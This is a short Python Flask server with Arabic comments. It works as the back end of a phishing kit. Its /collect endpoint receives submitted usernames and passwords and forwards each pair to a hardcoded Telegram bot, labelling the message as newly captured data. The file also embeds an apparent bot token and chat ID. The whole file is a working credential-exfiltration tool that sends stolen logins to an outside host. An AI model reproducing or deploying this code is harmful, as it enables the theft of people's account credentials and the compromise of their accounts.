from flask import Flask, request, jsonify
import os
import requests

app = Flask(__name__)

# بيانات تليجرام الخاصة بك
TELEGRAM_BOT_TOKEN = "9249129764:AAEz54D8XAUW9Puc-WKZCtH68RQ1No7M6gl"
CHAT_ID = "6032043580"

def send_to_telegram(username, password):
    message = f"🚨 تم التقاط بيانات جديدة!\n\n👤 المستخدم: {username}\n🔑 الباسورد: {password}"
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {"chat_id": CHAT_ID, "text": message}
    try:
        requests.post(url, json=payload)
    except Exception as e:
        print(f"Error: {e}")

@app.route('/collect', methods=['POST'])
def collect():
    data = request.get_json()
    if not data:
        return jsonify({"status": "error"}), 400
        
    username = data.get('username')
    password = data.get('password')
    
    # إرسال البيانات فوراً لتليجرام عندك
    send_to_telegram(username, password)
    
    return jsonify({"status": "success"}), 200

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)

